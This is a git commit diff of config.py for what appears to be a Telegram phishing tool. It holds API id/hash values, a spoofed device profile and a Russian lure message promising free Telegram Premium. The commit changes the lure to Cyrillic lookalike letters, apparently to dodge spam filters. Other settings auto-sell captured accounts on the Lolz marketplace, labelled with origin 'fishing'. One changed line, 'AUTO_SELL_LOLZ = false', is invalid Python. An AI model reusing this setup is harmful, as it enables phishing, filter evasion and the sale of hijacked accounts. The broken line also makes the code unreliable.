33982b136a8d7e938c1706e7febc5eec59b65e12
WeyzBusted <68425545+WeyzBusted@users.noreply.github.com>
2023-07-04 05:09:14 +0400

    Update config.py

--- config.py
+++ config.py
@@ -1,20 +1,21 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-api_id = 12857637
-api_hash = "96d45fb2da15cbec5585b90cee0d907e"
+api_id = 27577955
+api_hash = "f3126f1b33295477d025e4c034732896"
 device_model = "999 SM-G998B"
 system_version = "SDK 31"
 app_version = "8.4.1 (2522)"
 lang_code = "en"
 system_lang_code = "en-US"
 
-SEND_MSG = '@{username} — Бесплатный TeIеgrам prеmiuм 🎁'
+SEND_MSG = '@{username} — Бесплатный TeIеgrам рrеmiuм 🎁'
 
 # Lolz Setting
-AUTO_SELL_LOLZ = True
+AUTO_SELL_LOLZ = false
 LOLZ_KEY = ''
 LOLZ_ACCOUNT_PRICE = 11
+
 LOLZ_ACCOUNT_PREMIUM_PRICE = 80
 LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
 LOLZ_ACCOUNT_ORIGIN = 'fishing'
